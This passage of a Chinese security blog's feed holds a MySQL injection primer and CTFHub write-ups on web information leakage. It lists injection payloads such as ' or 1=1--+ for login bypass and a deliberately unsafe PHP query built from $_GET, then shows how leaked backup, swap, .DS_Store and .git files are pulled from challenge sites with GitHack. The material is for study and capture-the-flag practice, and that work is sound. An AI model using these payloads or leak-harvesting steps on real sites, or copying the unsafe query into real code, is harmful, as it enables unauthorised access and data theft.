-    <content type="html"><![CDATA[<p>此处介绍一些<strong>mysql</strong>注入的基础知识</p><h2 id="注入的分类"><a href="#注入的分类" class="headerlink" title="注入的分类"></a>注入的分类</h2><h3 id="基于从服务器接收到的响应"><a href="#基于从服务器接收到的响应" class="headerlink" title="基于从服务器接收到的响应"></a>基于从服务器接收到的响应</h3><ol><li>基于错误的SQL注入</li><li>联合查询的类型</li><li>堆查询注入</li><li>SQL盲注<ul><li>基于布尔的SQL盲注</li><li>基于时间的SQL盲注</li><li>基于报错的SQL盲注</li></ul></li></ol><h3 id="基于如何处理输入的SQL查询（数据类型）"><a href="#基于如何处理输入的SQL查询（数据类型）" class="headerlink" title="基于如何处理输入的SQL查询（数据类型）"></a>基于如何处理输入的SQL查询（数据类型）</h3><ol><li>基于字符串</li><li>数字或整数为基础的</li></ol><h3 id="基于程度和顺序的注入（哪里发生了影响）"><a href="#基于程度和顺序的注入（哪里发生了影响）" class="headerlink" title="基于程度和顺序的注入（哪里发生了影响）"></a>基于程度和顺序的注入（哪里发生了影响）</h3><ol><li>一阶注入</li><li>二阶注入<blockquote><p>一阶注射是指输入的注射语句对 WEB 直接产生了影响，出现了结果；二阶注入类似存<br>储型 XSS，是指输入提交的语句，无法直接对 WEB 应用程序产生影响，通过其它的辅助间<br>接的对 WEB 产生危害，这样的就被称为是二阶注入</p></blockquote></li></ol><h3 id="基于注入位置上的"><a href="#基于注入位置上的" class="headerlink" title="基于注入位置上的"></a>基于注入位置上的</h3><ol><li>通过用户输入的表单域的注入</li><li>通过cookie注入</li><li>通过服务器变量注入。（基于头部信息的注入）</li></ol><h2 id="系统函数"><a href="#系统函数" class="headerlink" title="系统函数"></a>系统函数</h2><p>介绍几个常用函数</p><ol><li><strong>version()</strong>——MySQL版本</li><li><strong>user()</strong>——数据库用户名</li><li><strong>datebase()</strong>——数据库名</li><li><strong>@@datadir</strong>——数据库路径</li><li><strong>@@version_compile_os</strong>——操作系统版本</li></ol><h2 id="字符串连接函数"><a href="#字符串连接函数" class="headerlink" title="字符串连接函数"></a>字符串连接函数</h2><p><a href="http://www.cnblogs.com/lcamry/p/5715634.html">函数具体介绍</a></p><ol><li>concat(str1,str2,…)——没有分隔符地连接字符串</li><li>concat_ws(separator,str1,str2,…)——含有分隔符的连接字符串</li><li>group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据说着比较抽象，其实也并不需要详细了解，知道这三个函数能一次性查出所有信息就行了</li></ol><h2 id="一般用于尝试的语句"><a href="#一般用于尝试的语句" class="headerlink" title="一般用于尝试的语句"></a>一般用于尝试的语句</h2><p>ps：–+可以用#替换，url提交过程中url编码后的#为%23</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">or 1&#x3D;1--+</span><br><span class="line">&#39;or 1&#x3D;1--+</span><br><span class="line">&quot;or 1&#x3D;1--+</span><br><span class="line">)or 1&#x3D;1--+</span><br><span class="line">&#39;)or 1&#x3D;1--+</span><br><span class="line">&quot;) or 1&#x3D;1--+</span><br><span class="line">&quot;))or 1&#x3D;1--+</span><br></pre></td></tr></table></figure><p>一般的代码为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p>此处考虑两个点，一个是闭合前面你的 ‘ 另一个是处理后面的 ‘ ，一般采用两种思路，闭合后面的引号或者注释掉，注释掉采用–+ 或者 #（%23）</p><h2 id="union操作符的介绍"><a href="#union操作符的介绍" class="headerlink" title="union操作符的介绍"></a>union操作符的介绍</h2><p>UNION 操作符用于合并两个或多个 SELECT 语句的结果集。请注意，UNION 内部的 SELECT<br>语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的<br>列的顺序必须相同。</p><h3 id="SQL-UNION-语法"><a href="#SQL-UNION-语法" class="headerlink" title="SQL UNION 语法"></a>SQL UNION 语法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name(s) FROM table_name1</span><br><span class="line">UNION</span><br><span class="line">SELECT column_name(s) FROM table_name2</span><br></pre></td></tr></table></figure><p>注释：默认地，UNION 操作符选取不同的值。如果允许重复的值，请使用 UNION ALL。</p><h3 id="SQL-UNION-ALL-语法"><a href="#SQL-UNION-ALL-语法" class="headerlink" title="SQL UNION ALL 语法"></a>SQL UNION ALL 语法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name(s) FROM table_name1</span><br><span class="line">UNION ALL</span><br><span class="line">SELECT column_name(s) FROM table_name2</span><br></pre></td></tr></table></figure><p>另外，UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名。</p><h2 id="sql中的逻辑运算"><a href="#sql中的逻辑运算" class="headerlink" title="sql中的逻辑运算"></a>sql中的逻辑运算</h2><p>首先提出一个问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select * from users where id&#x3D;1 and 1&#x3D;1;</span><br></pre></td></tr></table></figure><p>上面这条语句为什么能够选择出id=1的内容，and 1=1到底起了什么作用？这里就要清除sql语句执行顺序了。同时这个问题我们在使用万能密码的时候会用到。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select * from admin where username&#x3D;’admin’ and password&#x3D;’admin’</span><br></pre></td></tr></table></figure><p>我们可以用’ or 1=1#作为密码输入。原因是为什么？这里涉及到一个逻辑运算，当使用上述所谓的万能密码后，构成的sql语句为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select * from admin where username&#x3D;’admin’ and password&#x3D;’’or 1&#x3D;1#’</span><br></pre></td></tr></table></figure><p><strong>Explain</strong>:上面的这个语句执行后，我们在不知道密码的情况下就登录到了 admin 用户了。<br>原因是在where子句后，我们可以看到三个条件语句<strong>username=’admin’ and password=’’ or 1=1</strong>。三个条件用and和or进行拼接。在sql中，我们and的运算优先级大于or的运算优先级。 因此可以看到第一个条件（用 a 表示）是真的，第二个条件（用b 表示）是假的，a and b = false,第一个条件和第二个条件执行and后是假，再与第三<br>个条件 or 运算，因为第三个条件1=1是恒成立的，所以结果自然就为真了。因此上述的语句就是恒真了<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092201.png" alt="image"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">①Select * from users where id&#x3D;1 and 1&#x3D;1;</span><br><span class="line">②Select * from users where id&#x3D;1 &amp;&amp; 1&#x3D;1;</span><br><span class="line">③Select * from users where id&#x3D;1 &amp; 1&#x3D;1;</span><br></pre></td></tr></table></figure><p>上述三者有什么区别？①和②是一样的，表达的意思是 id=1 条件和 1=1 条件进行与运算</p><p>③的意思是 id=1 条件与 1 进行&amp;位操作，id=1 被当作 true，与 1 进行 &amp; 运算 结果还是 1，再进行=操作，1=1,还是 1（ps：&amp;的优先级大于=）</p><p>Ps:此处进行的位运算。我们可以将数转换为二进制再进行与、或、非、异或等运算。必要<br>的时候可以利用该方法进行注入结果。例如将某一字符转换为 ascii 码后，可以分别与<br>1,2,4,8,16,32.。。。进行与运算，可以得到每一位的值，拼接起来就是 ascii 码值。再从<br>ascii 值反推回字符。（运用较少）</p>]]></content>
-    
-    
-    <summary type="html">&lt;p&gt;此处介绍一些&lt;strong&gt;mysql&lt;/strong&gt;注入的基础知识&lt;/p&gt;
-&lt;h2 id=&quot;注入的分类&quot;&gt;&lt;a href=&quot;#注入的分类&quot; class=&quot;headerlink&quot; title=&quot;注入的分类&quot;&gt;&lt;/a&gt;注入的分类&lt;/h2&gt;&lt;h3 id=&quot;基于从服务器接收到的响应&quot;&gt;&lt;a href=&quot;#基于从服务器接收到的响应&quot; class=&quot;headerlink&quot; title=&quot;基于从服务器接收到的响应&quot;&gt;&lt;/a&gt;基于从服务器接收到的响应&lt;/h3&gt;&lt;ol&gt;
-&lt;li&gt;基于错误的SQL注入&lt;/li&gt;
-&lt;li&gt;联合查询的类型&lt;/li&gt;
-&lt;li&gt;堆查询注入&lt;/li&gt;
-&lt;li&gt;SQL盲注&lt;ul&gt;
-&lt;li&gt;基于布尔的SQL盲注&lt;/li&gt;
-&lt;li&gt;基于时间的SQL盲注&lt;/li&gt;
-&lt;li&gt;基于报错的SQL盲注&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h3 id=&quot;基于如何处理输入的SQL查询（数据类型）&quot;&gt;&lt;a href=&quot;#基于如何处理输入的SQL查询（数据类型）&quot; class=&quot;headerlink&quot; title=&quot;基于如何处理输入的SQL查询（数据类型）&quot;&gt;&lt;/a&gt;基于如何处理输入的SQL查询（数据类型）&lt;/h3&gt;&lt;ol&gt;
-&lt;li&gt;基于字符串&lt;/li&gt;
-&lt;li&gt;数字或整数为基础的&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h3 id=&quot;基于程度和顺序的注入（哪里发生了影响）&quot;&gt;&lt;a href=&quot;#基于程度和顺序的注入（哪里发生了影响）&quot; class=&quot;headerlink&quot; title=&quot;基于程度和顺序的注入（哪里发生了影响）&quot;&gt;&lt;/a&gt;基于程度和顺序的注入（哪里发生了影响）&lt;/h3&gt;&lt;ol&gt;
-&lt;li&gt;一阶注入&lt;/li&gt;
-&lt;li&gt;二阶注入&lt;blockquote&gt;
-&lt;p&gt;一阶注射是指输入的注射语句对 WEB 直接产生了影响，出现了结果；二阶注入类似存&lt;br&gt;储型 XSS，是指输入提交的语句，无法直接对 WEB 应用程序产生影响，通过其它的辅助间&lt;br&gt;接的对 WEB 产生危害，这样的就被称为是二阶注入&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h3 id=&quot;基于注入位置上的&quot;&gt;&lt;a href=&quot;#基于注入位置上的&quot; class=&quot;headerlink&quot; title=&quot;基于注入位置上的&quot;&gt;&lt;/a&gt;基于注入位置上的&lt;/h3&gt;&lt;ol&gt;
-&lt;li&gt;通过用户输入的表单域的注入&lt;/li&gt;
-&lt;li&gt;通过cookie注入&lt;/li&gt;
-&lt;li&gt;通过服务器变量注入。（基于头部信息的注入）&lt;/li&gt;
-&lt;/ol&gt;</summary>
-    
-    
-    
-    <category term="sqli-labs靶场" scheme="https://hzktester.top/categories/sqli-labs%E9%9D%B6%E5%9C%BA/"/>
-    
-    
-    <category term="sqli-labs" scheme="https://hzktester.top/tags/sqli-labs/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Web基础之信息泄露（上）</title>
-    <link href="https://hzktester.top/2020/08/18/Web%E5%9F%BA%E7%A1%80/CTFHub%E9%A2%98%E8%A7%A3-Web%E5%9F%BA%E7%A1%80%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%88%E4%B8%8A%EF%BC%89/"/>
-    <id>https://hzktester.top/2020/08/18/Web%E5%9F%BA%E7%A1%80/CTFHub%E9%A2%98%E8%A7%A3-Web%E5%9F%BA%E7%A1%80%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%88%E4%B8%8A%EF%BC%89/</id>
-    <published>2020-08-18T07:31:00.000Z</published>
-    <updated>2020-09-20T02:41:21.793Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081801.png" alt="image"></p><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>许多的Web应用程序一般会有对服务器的文件读取查看的功能，大多会用到提交的参数来指明文件名。</p><p>路径遍历漏洞隐藏一般在文件读取或者展示图片功能块这样的通过参数提交上来的文件名</p><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081802.png" alt="image"></p><p>点击之后会跳转到flag_in_here这个目录，挨个对里面的目录进行寻找拿到flag</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081803.png" alt="image"><br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081804.png" alt="image"></p><h2 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h2><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081805.png" alt="image"></p><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><p>PHPinfo：输出 PHP 当前状态的大量信息，包含了 PHP 编译选项、启用的扩展、PHP 版本、服务器信息和环境变量（如果编译为一个模块的话）、PHP环境变量、操作系统版本信息、path 变量、配置选项的本地值和主值、HTTP 头和PHP授权信息(License)。</p><p>　　phpinfo() 同时是个很有价值的、包含所有 EGPCS(Environment, GET, POST, Cookie, Server) 数据的调试工具。</p><h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p>打开是这样的~</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081806.png" alt="image"></p><p>浏览目录找到flag</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081807.png" alt="image"></p><h2 id="备份文件下载"><a href="#备份文件下载" class="headerlink" title="备份文件下载"></a>备份文件下载</h2><h3 id="网站源码泄露"><a href="#网站源码泄露" class="headerlink" title="网站源码泄露"></a>网站源码泄露</h3><p>当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081808.png" alt="image"></p><h4 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h4><p>常见的网站源码的文件名有：’web’, ‘website’, ‘backup’, ‘back’, ‘www’, ‘wwwroot’, ‘temp’等等。</p><p>常见的网站源码备份文件后缀有：’tar’, ‘tar.gz’, ‘zip’, ‘rar’等等。</p><h4 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h4><p>只需在网站根目录对可能存在的备份文件名进行遍历爆破。就可以下载到网站源码。</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081809.png" alt="image"></p><h3 id="bak文件泄露"><a href="#bak文件泄露" class="headerlink" title="bak文件泄露"></a>bak文件泄露</h3><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081810.png" alt="image"></p><h4 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h4><p>有些时候网站管理员可能为了方便，会在修改某个文件的时候先复制一份，将其命名为xxx.bak。而大部分Web Server对bak文件并不做任何处理，导致可以直接下载，从而获取到网站某个文件的源代码~</p><h4 id="题解-3"><a href="#题解-3" class="headerlink" title="题解"></a>题解</h4><p>访问链接，看到这样：</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081811.png" alt="image"></p><p>flag在index.php的源码里，同时我们想到这是bak文件，试试访问</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081812.png" alt="image"><br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081813.png" alt="image"></p><p>用notepad++打开</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081814.png" alt="image"></p><h3 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h3><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081815.png" alt="image"></p><h4 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h4><p>在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容</p><p>以 index.php 为例：第一次产生的交换文件名为 <strong>.index.php.swp</strong></p><p>再次意外退出后，将会产生名为 <strong>.index.php.swo</strong> 的交换文件</p><p>第三次产生的交换文件则为 <strong>.index.php.swn</strong></p><h4 id="题解-4"><a href="#题解-4" class="headerlink" title="题解"></a>题解</h4><p>将缓存文件下载下来，使用vim编辑原有文件，例如下载的 <strong>.index.php.swp</strong>，则说明之前编辑的文件名为<strong>index.php</strong></p><p>会提示是否恢复，选择<strong>R</strong>进行恢复即可看到原始内容</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081816.png" alt="image"><br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081817.png" alt="image"><br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081818.png" alt="image"></p><h3 id="DS-Store文件泄露"><a href="#DS-Store文件泄露" class="headerlink" title=".DS_Store文件泄露"></a>.DS_Store文件泄露</h3><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081819.png" alt="image"></p><h4 id="知识点-5"><a href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h4><p>.DS_Store是Mac下Finder用来保存如何展示 文件/文件夹 的数据文件，每个文件夹下对应一个。</p><p>如果开发/设计人员将.DS_Store上传部署到线上环境，可能造成文件目录结构泄漏，特别是备份文件、源代码文件。</p><p>在发布代码时未删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息。</p><p>这里需要一个py脚本：<strong>Python-dsstore-master</strong></p><h4 id="题解-5"><a href="#题解-5" class="headerlink" title="题解"></a>题解</h4><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081820.png" alt="image"></p><p>进入Python-dsstore-master目录</p><p>依次输入下图的命令：</p><p>生成.DS_Store.ctfhub（名字可以自定义）</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081821.png" alt="image"></p><p>用Python-dsstore-master目录中的main.py对刚刚生成的文件.DS_Store.ctfhub进行解析。</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081822.png" alt="image"></p><p>访问我们看到的.txt文件得到flag</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081823.png" alt="image"></p>]]></content>
-    
-    
-    <summary type="html">&lt;h2 id=&quot;目录遍历&quot;&gt;&lt;a href=&quot;#目录遍历&quot; class=&quot;headerlink&quot; title=&quot;目录遍历&quot;&gt;&lt;/a&gt;目录遍历&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081801.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
-&lt;h3 id=&quot;知识点&quot;&gt;&lt;a href=&quot;#知识点&quot; class=&quot;headerlink&quot; title=&quot;知识点&quot;&gt;&lt;/a&gt;知识点&lt;/h3&gt;&lt;p&gt;许多的Web应用程序一般会有对服务器的文件读取查看的功能，大多会用到提交的参数来指明文件名。&lt;/p&gt;
-&lt;p&gt;路径遍历漏洞隐藏一般在文件读取或者展示图片功能块这样的通过参数提交上来的文件名&lt;/p&gt;
-&lt;h3 id=&quot;题解&quot;&gt;&lt;a href=&quot;#题解&quot; class=&quot;headerlink&quot; title=&quot;题解&quot;&gt;&lt;/a&gt;题解&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081802.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
-&lt;p&gt;点击之后会跳转到flag_in_here这个目录，挨个对里面的目录进行寻找拿到flag&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081803.png&quot; alt=&quot;image&quot;&gt;&lt;br&gt;&lt;img src=&quot;http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081804.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
-&lt;h2 id=&quot;PHPINFO&quot;&gt;&lt;a href=&quot;#PHPINFO&quot; class=&quot;headerlink&quot; title=&quot;PHPINFO&quot;&gt;&lt;/a&gt;PHPINFO&lt;/h2&gt;</summary>
-    
-    
-    
-    <category term="Web基础" scheme="https://hzktester.top/categories/Web%E5%9F%BA%E7%A1%80/"/>
-    
-    
-    <category term="信息泄露" scheme="https://hzktester.top/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Web基础之信息泄露（下）</title>
-    <link href="https://hzktester.top/2020/08/18/Web%E5%9F%BA%E7%A1%80/CTFHub%E9%A2%98%E8%A7%A3-Web%E5%9F%BA%E7%A1%80%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%88%E4%B8%8B%EF%BC%89/"/>
-    <id>https://hzktester.top/2020/08/18/Web%E5%9F%BA%E7%A1%80/CTFHub%E9%A2%98%E8%A7%A3-Web%E5%9F%BA%E7%A1%80%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%88%E4%B8%8B%EF%BC%89/</id>
-    <published>2020-08-18T07:31:00.000Z</published>
-    <updated>2020-09-20T04:14:22.716Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="Git泄露"><a href="#Git泄露" class="headerlink" title="Git泄露"></a>Git泄露</h2><p>以下需要用到python脚本：Githack<br><a href="https://github.com/BugScanTeam/GitHack">https://github.com/BugScanTeam/GitHack</a></p><h3 id="log"><a href="#log" class="headerlink" title="log"></a>log</h3><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081824.png" alt="image"></p><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p>查看历史记录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git log</span><br></pre></td></tr></table></figure><p>切换版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset</span><br></pre></td></tr></table></figure><p>对比两次提交</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff</span><br></pre></td></tr></table></figure><h4 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h4><ol><li><p>扫描发现 .git 泄露</p><p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081825.png" alt="image"></p></li><li><p>使用 GitHack 工具 clone 目标源代码到本地</p><p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081826.png" alt="image"></p></li><li><p>执行 git log 查看历史记录</p><p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081827.png" alt="image"></p></li><li><p>执行 git show 查看提交详情</p><p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081828.png" alt="image"></p><h3 id="Stash"><a href="#Stash" class="headerlink" title="Stash"></a>Stash</h3><h4 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h4><p>git 泄露 .git/refs/stash</p></li></ol><p>stash 用于保存 git 工作状态到 git 栈，在需要的时候再恢复。</p><h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><ol><li><p>尝试访问敏感目录，发现.git目录<strong><a href="http://challenge-b48a889fd49f7430.sandbox.ctfhub.com:10080/.git/config">http://challenge-b48a889fd49f7430.sandbox.ctfhub.com:10080/.git/config</a></strong></p></li><li><p>利用GitHack 工具将网站源代码 clone 到本地</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GitHack.py http:&#x2F;&#x2F;challenge-b48a889fd49f7430.sandbox.ctfhub.com:10080&#x2F;.git&#x2F;</span><br></pre></td></tr></table></figure><p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081829.png" alt="image"></p></li><li><p>查看 <strong>.git/refs/stash</strong> 找到 <strong>stash</strong> 对应的 <strong>hash</strong></p><p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081830.png" alt="image"></p></li><li><p>git diff 9dbafcb8c4629b4b843991b6ebe5eca874812fc4 得到flag</p><p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081831.png" alt="image"></p></li></ol><h3 id="Index"><a href="#Index" class="headerlink" title="Index"></a>Index</h3><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081832.png" alt="image"></p><h4 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h4><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081833.png" alt="image"><br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081834.png" alt="image"></p>]]></content>
-    
-    
-    <summary type="html">&lt;h2 id=&quot;Git泄露&quot;&gt;&lt;a href=&quot;#Git泄露&quot; class=&quot;headerlink&quot; title=&quot;Git泄露&quot;&gt;&lt;/a&gt;Git泄露&lt;/h2&gt;&lt;p&gt;以下需要用到python脚本：Githack&lt;br&gt;&lt;a href=&quot;https://github.com/BugScanTeam/GitHack&quot;&gt;https://github.com/BugScanTeam/GitHack&lt;/a&gt;&lt;/p&gt;
-&lt;h3 id=&quot;log&quot;&gt;&lt;a href=&quot;#log&quot; class=&quot;headerlink&quot; title=&quot;log&quot;&gt;&lt;/a&gt;log&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081824.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
-&lt;h4 id=&quot;知识点&quot;&gt;&lt;a href=&quot;#知识点&quot; class=&quot;headerlink&quot; title=&quot;知识点&quot;&gt;&lt;/a&gt;知识点&lt;/h4&gt;&lt;p&gt;查看历史记录&lt;/p&gt;
-&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git log&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;切换版本&lt;/p&gt;
-&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git reset&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;对比两次提交&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="Web基础" scheme="https://hzktester.top/categories/Web%E5%9F%BA%E7%A1%80/"/>
-    
-    
-    <category term="信息泄露" scheme="https://hzktester.top/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
     
   </entry>
   
